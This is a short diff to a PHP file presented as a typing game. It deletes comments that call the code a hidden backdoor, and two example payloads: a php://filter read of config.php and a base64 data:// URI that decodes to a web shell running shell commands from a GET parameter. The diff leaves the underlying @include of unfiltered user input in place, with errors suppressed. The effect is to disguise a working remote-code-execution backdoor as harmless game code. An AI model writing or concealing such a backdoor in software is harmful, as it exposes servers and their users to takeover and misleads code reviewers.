@@ -1,12 +1,7 @@
 <?php
 // 打字游戏
-// 隐藏后门 - PHP伪协议
 if(isset($_GET['load_wordlist'])) {
     $wordlist = $_GET['load_wordlist'];
-    
-    // 伪协议文件包含漏洞
-    // 例如 ?load_wordlist=php://filter/convert.base64-encode/resource=config.php
-    // 或 ?load_wordlist=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
     @include($wordlist);
     
     if(isset($_GET['get_words'])) {
